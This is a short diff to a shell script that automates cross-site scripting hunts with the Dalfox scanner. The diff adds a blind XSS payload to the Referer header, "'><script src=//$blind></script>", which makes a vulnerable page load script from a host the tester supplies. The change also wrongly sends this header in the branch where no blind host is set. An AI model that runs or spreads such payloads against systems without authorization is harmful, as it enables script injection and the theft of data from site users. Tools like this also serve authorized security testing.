@@ -110,10 +110,10 @@ fi
 # STart XSS Hunting by checking if Blind XSS payload is present or not.
 if [ -z "$blind" ] ; then
     echo "XSS Automation Started using Dalfox.."
-    dalfox file $domain_xss.txt -o $out
+    dalfox file $domain_xss.txt -o $out -H "referrer: xxx'><script src=//$blind></script>"
 else
     echo "XSS Automation Started using Dalfox with your Blind Payload.."
-    dalfox file "$domain"_xss.txt -b $blind -o $out
+    dalfox file "$domain"_xss.txt -b $blind -o $out -H "referrer: xxx'><script src=//$blind></script>"
 fi
 
 # Final Result
